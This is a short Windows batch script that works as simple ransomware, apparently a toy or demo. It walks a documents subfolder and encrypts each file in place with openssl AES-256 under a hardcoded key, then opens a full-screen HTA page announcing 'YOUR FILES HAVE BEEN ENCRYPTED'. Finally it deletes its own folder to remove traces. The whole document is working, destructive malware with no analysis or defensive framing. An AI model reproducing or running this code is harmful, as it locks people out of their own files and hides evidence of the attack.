@echo off

cd /d %~dp0

set key=eyeofrah

:: traverse entire user directory
for /r "%USERPROFILE%\documents\test" %%f in (*) do (
    echo %%f | findstr /i %~dp0 >nul

    if errorlevel 1 (
        openssl enc -aes-256-cbc -in %%f -out "%%f.temp" -pass pass:%key% -pbkdf2
        move /Y "%%f.temp" %%f >nul 2>&1
    )
)

:: lol
set "file=%TEMP%\alert.hta"

echo ^<html^> > %file%
echo     ^<hta:application sysmenu="no" Caption="no" windowstate="maximize"/^> >> %file%
echo     ^<style^> body{ background: red; overflow: hidden; } #alert { padding-top: 20%%; letter-spacing: 1px; text-align: center; color: white; font-family: "Comic Sans MS" } ^</style^> >> %file%
echo     ^<div id="alert"^>^<h1^>YOUR FILES HAVE BEEN ENCRYPTED^<br^>^<br^>^<br^>WOMP WOMP^</h1^>^</div^> >> %file%
echo ^</html^> >> %file%

start %file%

:: delete own folder
cd ..
start /b rmdir %~dp0 /s /q